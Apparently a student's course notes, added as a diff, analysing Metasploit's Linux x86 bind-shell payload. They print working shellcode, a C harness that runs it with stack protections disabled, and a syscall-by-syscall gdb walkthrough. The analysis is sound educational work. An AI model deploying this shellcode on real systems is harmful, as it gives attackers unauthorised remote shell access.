@@ -1,0 +1,438 @@
+toor@ubuntu:~/Desktop/slae/Assignments/5/exec$ msfvenom -p linux/x86/shell_bind_tcp  --list-options                                                 [13/1981]
+Options for payload/linux/x86/shell_bind_tcp:
+=========================
+
+
+       Name: Linux Command Shell, Bind TCP Inline
+     Module: payload/linux/x86/shell_bind_tcp
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 78
+       Rank: Normal
+
+Provided by:
+    Ramon de C Valle <rcvalle@metasploit.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LPORT  4444             yes       The listen port
+RHOST                   no        The target address
+
+Description:
+  Listen for a connection and spawn a command shell
+
+toor@ubuntu:~/Desktop/slae/Assignments/5/exec$ msfvenom -p linux/x86/shell_bind_tcp  -f c LPORT=8080
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 78 bytes
+Final size of c file: 354 bytes
+unsigned char buf[] =
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x5b\x5e\x52\x68\x02\x00\x1f\x90\x6a\x10\x51\x50\x89\xe1\x6a"
+"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
+"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
+"\x0b\xcd\x80";
+toor@ubuntu:~/Desktop/slae/Assignments/5/exec$
+
+
+
+toor@ubuntu:~/Desktop/slae/Assignments/5/exec$ nano shellcodetest.c
+toor@ubuntu:~/Desktop/slae/Assignments/5/exec$ gcc -fno-stack-protector -z execstack shellcodetest.c -o shellcode
+toor@ubuntu:~/Desktop/slae/Assignments/5/exec$ cat shellcodetest.c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x5b\x5e\x52\x68\x02\x00\x1f\x90\x6a\x10\x51\x50\x89\xe1\x6a"
+"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
+"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
+"\x0b\xcd\x80";
+
+int main(void)
+{
+
+        printf("shellcode length: %d\n",strlen(code));
+        (*(void(*)()) code)();
+}
+toor@ubuntu:~/Desktop/slae/Assignments/5/exec$
+
+
+With libemu’s sctest utility, we can see that the shellcode executes the following functions:
+
+gdb-peda$ disassemble                                                                                                                                [4/1811]
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     xor    ebx,ebx
+   0x0804a042 <+2>:     mul    ebx
+   0x0804a044 <+4>:     push   ebx
+   0x0804a045 <+5>:     inc    ebx
+   0x0804a046 <+6>:     push   ebx
+   0x0804a047 <+7>:     push   0x2
+   0x0804a049 <+9>:     mov    ecx,esp
+   0x0804a04b <+11>:    mov    al,0x66
+   0x0804a04d <+13>:    int    0x80    (1)
+   0x0804a04f <+15>:    pop    ebx
+   0x0804a050 <+16>:    pop    esi
+   0x0804a051 <+17>:    push   edx
+   0x0804a052 <+18>:    push   0x901f0002
+   0x0804a057 <+23>:    push   0x10
+   0x0804a059 <+25>:    push   ecx
+   0x0804a05a <+26>:    push   eax
+   0x0804a05b <+27>:    mov    ecx,esp
+   0x0804a05d <+29>:    push   0x66
+   0x0804a05f <+31>:    pop    eax
+   0x0804a060 <+32>:    int    0x80     (2)
+   0x0804a062 <+34>:    mov    DWORD PTR [ecx+0x4],eax
+   0x0804a065 <+37>:    mov    bl,0x4
+   0x0804a067 <+39>:    mov    al,0x66
+   0x0804a069 <+41>:    int    0x80     (3)
+   0x0804a06b <+43>:    inc    ebx
+   0x0804a06c <+44>:    mov    al,0x66
+   0x0804a06e <+46>:    int    0x80     (4)
+   0x0804a070 <+48>:    xchg   ebx,eax
+   0x0804a071 <+49>:    pop    ecx
+   0x0804a072 <+50>:    push   0x3f
+   0x0804a074 <+52>:    pop    eax
+   0x0804a075 <+53>:    int    0x80     (5)
+   0x0804a077 <+55>:    dec    ecx
+   0x0804a078 <+56>:    jns    0x804a072 <code+50>
+   0x0804a07a <+58>:    push   0x68732f2f
+   0x0804a07f <+63>:    push   0x6e69622f
+   0x0804a084 <+68>:    mov    ebx,esp
+   0x0804a086 <+70>:    push   eax
+   0x0804a087 <+71>:    push   ebx
+   0x0804a088 <+72>:    mov    ecx,esp
+   0x0804a08a <+74>:    mov    al,0xb
+   0x0804a08c <+76>:    int    0x80       (6)
+   0x0804a08e <+78>:    add    BYTE PTR [eax],al
+End of assembler dump.
+gdb-peda$
+
+SYSCALL Number 1 
+
+   0x0804a040 <+0>:     xor    ebx,ebx
+   0x0804a042 <+2>:     mul    ebx 		;eax and edx will get cleared
+   0x0804a044 <+4>:     push   ebx
+   0x0804a045 <+5>:     inc    ebx 		;ebx is set to 1 for SYS_SOCKET
+   0x0804a046 <+6>:     push   ebx
+   0x0804a047 <+7>:     push   0x2
+   0x0804a049 <+9>:     mov    ecx,esp
+   0x0804a04b <+11>:    mov    al,0x66
+=> 0x0804a04d <+13>:    int    0x80    (1)
+
+
+EAX: 0x66 ('f')
+EBX: 0x1
+ECX: 0xbffff730 --> 0x2
+EDX: 0x0
+ESI: 0x0
+EDI: 0x804a055 --> 0x106a901f
+EBP: 0xbffff768 --> 0x0
+ESP: 0xbffff730 --> 0x2
+EIP: 0x804a04d --> 0x5e5b80cd
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804a047 <code+7>:  push   0x2
+   0x804a049 <code+9>:  mov    ecx,esp
+   0x804a04b <code+11>: mov    al,0x66
+=> 0x804a04d <code+13>: int    0x80
+   0x804a04f <code+15>: pop    ebx
+   0x804a050 <code+16>: pop    esi
+   0x804a051 <code+17>: push   edx
+   0x804a052 <code+18>: push   0x901f0002
+
+
+EAX = 0x66  ie 102
+toor@ubuntu:/usr/include/i386-linux-gnu/sys$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 102
+#define __NR_socketcall         102
+
+int socketcall(int call, unsigned long *args);
+
+EBX, 0x1 : ie SYS_SOCKET has a value of 1
+http://man7.org/linux/man-pages/man2/socketcall.2.html
+ 	man 2 socket gives  int socket(int domain, int type, int protocol); ; so these are the arguments ,should be supplied va ecx via refernce
+
+ ECX = 0xbffff730
+gdb-peda$ x/12xb 0xbffff730
+0xbffff730:     0x02    0x00    0x00    0x00    0x01    0x00    0x00    0x00
+0xbffff738:     0x00    0x00    0x00    0x00
+gdb-peda$
+
+
+0x2 : AF_INET      ;domain   ; AF_INET             IPv4 Internet protocols    , refer man 2 socket
+0x1 : SOCK_STREAM  ;type     ; SOCK_STREAM     Provides sequenced, reliable, two-way, connection-based byte streams.    
+
+
+0x0 : protocol
+
+toor@ubuntu:/usr/include/i386-linux-gnu/sys$ cat /etc/protocols
+# Internet (IP) protocols
+#
+# Updated from http://www.iana.org/assignments/protocol-numbers and other
+# sources.
+# New protocols will be added on request if they have been officially
+# assigned by IANA and are not historical.
+# If you need a huge list of used numbers please install the nmap package.
+
+ip      0       IP              # internet protocol, pseudo protocol number
+
+
+SYSCALL Number 2
+   0x0804a04f <+15>:    pop    ebx
+   0x0804a050 <+16>:    pop    esi
+   0x0804a051 <+17>:    push   edx
+   0x0804a052 <+18>:    push   0x901f0002
+   0x0804a057 <+23>:    push   0x10
+   0x0804a059 <+25>:    push   ecx
+   0x0804a05a <+26>:    push   eax
+   0x0804a05b <+27>:    mov    ecx,esp
+   0x0804a05d <+29>:    push   0x66
+   0x0804a05f <+31>:    pop    eax
+   0x0804a060 <+32>:    int    0x80 
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x66 ('f')
+EBX: 0x2
+ECX: 0xbffff724 --> 0x7
+EDX: 0x0
+ESI: 0x1
+EDI: 0x804a055 --> 0x106a901f
+EBP: 0xbffff768 --> 0x0
+ESP: 0xbffff724 --> 0x7
+EIP: 0x804a060 --> 0x418980cd
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804a05b <code+27>: mov    ecx,esp
+   0x804a05d <code+29>: push   0x66
+   0x804a05f <code+31>: pop    eax
+=> 0x804a060 <code+32>: int    0x80
+   0x804a062 <code+34>: mov    DWORD PTR [ecx+0x4],eax
+   0x804a065 <code+37>: mov    bl,0x4
+   0x804a067 <code+39>: mov    al,0x66
+   0x804a069 <code+41>: int    0x80
+
+EAX = 0x66  ie 102
+toor@ubuntu:/usr/include/i386-linux-gnu/sys$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 102
+#define __NR_socketcall         102
+
+int socketcall(int call, unsigned long *args);
+
+EBX = 0x2 , SYS_BIND from
+http://man7.org/linux/man-pages/man2/socketcall.2.html
+
+man 2 bind gives int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen); , hence should be the arguments refered by ECX
+ECX : 0xbffff724
+
+gdb-peda$ x/12xb 0xbffff724
+0xbffff724:     0x07    0x00    0x00    0x00    0x30    0xf7    0xff    0xbf
+0xbffff72c:     0x10    0x00    0x00    0x00
+
+0x07 ; socketdescripter created via socket call number 1ç
+0xbffff730 ; address to the structure
+gdb-peda$ x/16xb 0xbffff730
+0xbffff730:     0x02    0x00    0x1f    0x90    0x00    0x00    0x00    0x00
+0xbffff738:     0x00    0x00    0x00    0x00    0x29    0x84    0x04    0x08
+
+0x02 : AF_INET
+0x1f 90 :  8080  , port
+ip address , in this case 0.0.0.0
+
+0x10: ie 16 addrlen
+
+we have created a socket using forst syscall , using these we have assigned name to it , ie ip address , protocol,port to bind etc
+
+
+SYSCALL No:3
+Listen for incoming connections 
+
+   0x0804a062 <+34>:    mov    DWORD PTR [ecx+0x4],eax
+   0x0804a065 <+37>:    mov    bl,0x4
+   0x0804a067 <+39>:    mov    al,0x66
+   0x0804a069 <+41>:    int    0x80
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x66 ('f')
+EBX: 0x4
+ECX: 0xbffff724 --> 0x7
+EDX: 0x0
+ESI: 0x1
+EDI: 0x804a055 --> 0x106a901f
+EBP: 0xbffff768 --> 0x0
+ESP: 0xbffff724 --> 0x7
+EIP: 0x804a069 --> 0xb04380cd
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804a062 <code+34>: mov    DWORD PTR [ecx+0x4],eax
+   0x804a065 <code+37>: mov    bl,0x4
+   0x804a067 <code+39>: mov    al,0x66
+=> 0x804a069 <code+41>: int    0x80
+   0x804a06b <code+43>: inc    ebx
+   0x804a06c <code+44>: mov    al,0x66
+   0x804a06e <code+46>: int    0x80
+   0x804a070 <code+48>: xchg   ebx,eax
+
+EAX = 0x66  ie 102
+toor@ubuntu:/usr/include/i386-linux-gnu/sys$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 102
+#define __NR_socketcall         102
+
+int socketcall(int call, unsigned long *args);
+
+EBX , 0x4 ie SYS_LISTEN 
+http://man7.org/linux/man-pages/man2/socketcall.2.html
+	 int listen(int sockfd, int backlog);
+
+gdb-peda$ x/2xb 0xbffff724
+0xbffff724:     0x07    0x00    
+
+0x07 is the socket file descripter and the backlog is set to zero
+
+
+SYS CALL number 4
+
+Accept an incoming connection 
+
+   0x0804a06b <+43>:    inc    ebx
+   0x0804a06c <+44>:    mov    al,0x66
+   0x0804a06e <+46>:    int    0x80
+
+EAX: 0x66 ('f')
+EBX: 0x5
+ECX: 0xbffff724 --> 0x7
+EDX: 0x0
+ESI: 0x1
+EDI: 0x804a055 --> 0x106a901f
+EBP: 0xbffff768 --> 0x0
+ESP: 0xbffff724 --> 0x7
+EIP: 0x804a06e --> 0x599380cd
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804a069 <code+41>: int    0x80
+   0x804a06b <code+43>: inc    ebx
+   0x804a06c <code+44>: mov    al,0x66
+=> 0x804a06e <code+46>: int    0x80
+   0x804a070 <code+48>: xchg   ebx,eax
+   0x804a071 <code+49>: pop    ecx
+   0x804a072 <code+50>: push   0x3f
+   0x804a074 <code+52>: pop    eax
+
+EAX = 0x66  ie 102
+toor@ubuntu:/usr/include/i386-linux-gnu/sys$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 102
+#define __NR_socketcall         102
+
+int socketcall(int call, unsigned long *args);
+
+EBX=0x5	, SYS_ACCEPT
+	 http://man7.org/linux/man-pages/man2/socketcall.2.html
+	 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);  #check here
+
+similar to bind function and the structure remains the same
+
+SYSCALL No 5:
+duplicate stdin stdout and stderror 0,1 and 2 with loop
+
+EAX: 0x3f ('?')
+EBX: 0x8
+ECX: 0x7
+EDX: 0x0
+ESI: 0x1
+EDI: 0x804a055 --> 0x106a901f
+EBP: 0xbffff768 --> 0x0
+ESP: 0xbffff728 --> 0x0
+EIP: 0x804a075 --> 0x794980cd
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804a071 <code+49>: pop    ecx
+   0x804a072 <code+50>: push   0x3f
+   0x804a074 <code+52>: pop    eax
+=> 0x804a075 <code+53>: int    0x80
+
+EAX = 0x3f ie 63 
+toor@ubuntu:~/Desktop/slae/Assignments/5$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 63
+#define __NR_dup2                63
+
+   0x0804a070 <+48>:    xchg   ebx,eax ; the new connection socket descripter is copied to ebx
+   0x0804a071 <+49>:    pop    ecx     ; counter for the loop
+   0x0804a072 <+50>:    push   0x3f    ; dup2 syscall value
+   0x0804a074 <+52>:    pop    eax      
+   0x0804a075 <+53>:    int    0x80
+=> 0x0804a077 <+55>:    dec    ecx
+   0x0804a078 <+56>:    jns    0x804a072 <code+50>
+
+SYSCALL NO:6
+
+execve call to bind the process /bin/sh
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xb ('\x0b')
+EBX: 0xbffff720 ("/bin//sh")
+ECX: 0xbffff718 --> 0xbffff720 ("/bin//sh")
+EDX: 0x0
+ESI: 0x1
+EDI: 0x804a055 --> 0x106a901f
+EBP: 0xbffff768 --> 0x0
+ESP: 0xbffff718 --> 0xbffff720 ("/bin//sh")
+EIP: 0x804a08c --> 0x80cd
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804a087 <code+71>: push   ebx
+   0x804a088 <code+72>: mov    ecx,esp
+   0x804a08a <code+74>: mov    al,0xb
+=> 0x804a08c <code+76>: int    0x80
+
+Eax =0xb , 11 execve
+int execve(const char *filename, char *const argv[],char *const envp[]);  
+            /bin/bash            address to /bin/bash,  0
+
+
+=> 0x0804a040 <+0>:     xor    ebx,ebx 			 clear ebx 
+   0x0804a042 <+2>:     mul    ebx               clear edx and eax
+   0x0804a044 <+4>:     push   ebx               
+   0x0804a045 <+5>:     inc    ebx 				 
+   0x0804a046 <+6>:     push   ebx
+   0x0804a047 <+7>:     push   0x2               
+   0x0804a049 <+9>:     mov    ecx,esp           
+   0x0804a04b <+11>:    mov    al,0x66  
+   0x0804a04d <+13>:    int    0x80    (1)       syscall socket for socket creation
+   0x0804a04f <+15>:    pop    ebx
+   0x0804a050 <+16>:    pop    esi
+   0x0804a051 <+17>:    push   edx
+   0x0804a052 <+18>:    push   0x901f0002        port 8080
+   0x0804a057 <+23>:    push   0x10
+   0x0804a059 <+25>:    push   ecx
+   0x0804a05a <+26>:    push   eax
+   0x0804a05b <+27>:    mov    ecx,esp
+   0x0804a05d <+29>:    push   0x66
+   0x0804a05f <+31>:    pop    eax
+   0x0804a060 <+32>:    int    0x80     (2)      syscall socket for socket creation sys_bind
+   0x0804a062 <+34>:    mov    DWORD PTR [ecx+0x4],eax
+   0x0804a065 <+37>:    mov    bl,0x4
+   0x0804a067 <+39>:    mov    al,0x66
+   0x0804a069 <+41>:    int    0x80     (3)      syscall socket sys_listen
+   0x0804a06b <+43>:    inc    ebx
+   0x0804a06c <+44>:    mov    al,0x66
+   0x0804a06e <+46>:    int    0x80     (4)       syscall socket sys_accept
+   0x0804a070 <+48>:    xchg   ebx,eax
+   0x0804a071 <+49>:    pop    ecx
+   0x0804a072 <+50>:    push   0x3f
+   0x0804a074 <+52>:    pop    eax
+   0x0804a075 <+53>:    int    0x80     (5)       dup2 to duplicate stdion,stdout and stderror sessions
+   0x0804a077 <+55>:    dec    ecx
+   0x0804a078 <+56>:    jns    0x804a072 <code+50>
+   0x0804a07a <+58>:    push   0x68732f2f
+   0x0804a07f <+63>:    push   0x6e69622f
+   0x0804a084 <+68>:    mov    ebx,esp
+   0x0804a086 <+70>:    push   eax
+   0x0804a087 <+71>:    push   ebx
+   0x0804a088 <+72>:    mov    ecx,esp
+   0x0804a08a <+74>:    mov    al,0xb
+   0x0804a08c <+76>:    int    0x80       (6)     execve syscall to bind the process /bin/bash
+   0x0804a08e <+78>:    add    BYTE PTR [eax],al
+
+
+   https://h0mbre.github.io/SLAE_MSF_Analysis/#
+   https://snowscan.io/msfvenom-shellcode-analysis/#
